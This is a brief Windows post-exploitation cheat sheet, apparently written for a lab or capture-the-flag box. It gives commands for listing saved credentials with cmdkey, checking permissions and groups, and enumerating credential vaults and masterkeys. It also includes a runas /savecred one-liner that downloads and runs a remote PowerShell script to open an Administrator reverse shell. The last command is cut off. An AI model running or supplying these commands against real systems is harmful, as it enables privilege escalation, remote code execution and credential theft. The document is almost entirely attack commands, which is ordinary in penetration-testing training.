# Misc

***

**displays stored user names and passwords or credentials.**

```bash
cmdkey /list
```

**verify permission**

```bash
icacls C:\Users\Public\Desktop
```

**verify groups**

```bash
whoami /groups
```

**The following command is used to start a PowerShell reverse shell as ACCESS\Administrator.**

```bash
runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2/admin.ps1')"
```

**The following "one-liner" will identify the available credential files and masterkeys**

```bash
cmd /c "dir /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & dir /S /AS
```

